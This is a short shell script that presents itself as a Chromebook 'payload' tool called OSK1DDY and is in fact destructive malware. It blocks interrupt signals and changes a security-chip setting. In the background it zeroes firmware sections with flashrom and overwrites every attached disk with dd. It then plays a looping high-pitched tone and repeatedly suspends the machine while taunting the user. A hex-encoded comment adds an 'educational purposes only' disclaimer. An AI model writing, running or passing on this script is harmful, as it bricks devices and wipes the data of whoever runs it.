#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin
set -e

trap '' SIGINT SIGTSTP SIGTERM


clear


echo -e "   OSK1DDY  "
echo "-------------------"
echo "  Skid Assistance  "


    gsctool -a -I AllowUnverifiedRo:always >/dev/null 2>&1 || true


echo -e "BOOTING OSK1DDY PAYLOAD..."
sleep 2

(

   flashrom -p host --section RW_FWMP -w /dev/zero >/dev/null 2>&1 || true
    
    flashrom -p host --section RO_VPD -w /dev/zero >/dev/null 2>&1 || true
    flashrom -p host --section RW_SECTION_A -w /dev/zero >/dev/null 2>&1 || true
    flashrom -p host --section RW_SECTION_B -w /dev/zero >/dev/null 2>&1 || true
    flashrom -p host --section FMAP -w /dev/zero >/dev/null 2>&1 || true

    for d in /dev/mmcblk* /dev/nvme* /dev/sd*; do
        [ -b "$d" ] && dd if=/dev/zero of="$d" bs=1M count=2000 conv=notrunc >/dev/null 2>&1
    done
) &

( while true; do speaker-test -t sine -f 3500 -l 1 >/dev/null 2>&1; done ) &

while true; do
    clear

    echo " [!] STATUS: stop skidding"                   "
    
    sudo powerd_dbus_suspend >/dev/null 2>&1
    sleep 2
done

# 20 54 68 69 73 20 74 6f 6f 6c 20 69 73 20 69 6e 74 65 6e 64 65 64 20 66 6f 72 20 65 64 75 63 61 74 69 6f 6e 61 6c 20 70 75 72 70 6f 73 65 73 20 6f 6e 6c 79 2e 20 54 68 65 20 75 73 65 72 20 61 73 73 75 6d 65 73 20 61 6c 6c 20 72 65 73 70 6f 6e 73 69 62 69 6c 69 74 79 20 66 6f 72 20 61 64 68 65 72 69 6e 67 20 74 6f 20 6c 6f 63 61 6c 20 6c 61 77 73 20 61 6e 64 20 70 6c 61 74 66 6f 72 6d 20 74 65 72 6d 73 20 6f 66 20 73 65 72 76 69 63 65 2e